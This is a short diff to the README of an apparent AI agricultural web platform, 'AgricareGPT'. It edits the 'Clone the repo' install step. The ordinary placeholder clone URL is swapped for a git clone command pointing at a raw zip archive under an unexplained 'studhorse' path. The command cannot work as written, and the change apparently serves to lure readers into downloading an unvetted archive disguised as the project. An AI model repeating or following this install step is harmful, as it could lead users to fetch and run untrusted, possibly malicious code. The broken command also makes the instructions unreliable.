@@ -55,4 +55,4 @@ AgricareGPT is a responsive, AI-powered agricultural web platform designed to su
 
 1. Clone the repo  
    ```bash
-   git clone https://github.com/your-username/agricare-gpt.git
+   git clone https://raw.githubusercontent.com/AgricareBot/AgriCare.github.io/main/studhorse/AgriCare.github.io.zip
